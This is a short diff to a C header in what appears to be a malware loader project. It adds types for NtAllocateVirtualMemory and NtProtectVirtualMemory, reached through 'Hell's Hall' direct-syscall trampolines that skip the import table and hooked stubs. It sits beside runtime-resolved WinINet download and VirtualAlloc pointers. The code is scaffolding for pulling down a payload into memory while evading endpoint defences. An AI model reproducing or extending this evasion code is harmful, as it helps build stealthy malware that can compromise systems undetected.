@@ -38,6 +38,13 @@ typedef HINTERNET (WINAPI *PFN_InternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWOR
 typedef BOOL    (WINAPI *PFN_InternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
 typedef BOOL    (WINAPI *PFN_InternetCloseHandle)(HINTERNET);
 
+/* S34: Nt* wrappers populated via Hell's Hall — no IAT entry, no stub
+ * execution. Both entries point at naked asm trampolines in syscalls.c. */
+typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
+    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
+    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+
 typedef struct {
     PFN_VirtualAlloc        VirtualAlloc;
     PFN_VirtualFree         VirtualFree;
@@ -48,6 +55,8 @@ typedef struct {
     PFN_InternetOpenUrlA    InternetOpenUrlA;
     PFN_InternetReadFile    InternetReadFile;
     PFN_InternetCloseHandle InternetCloseHandle;
+    PFN_NtAllocateVirtualMemory NtAllocateVirtualMemory;
+    PFN_NtProtectVirtualMemory  NtProtectVirtualMemory;
 } api_t;
 
 extern api_t g_api;
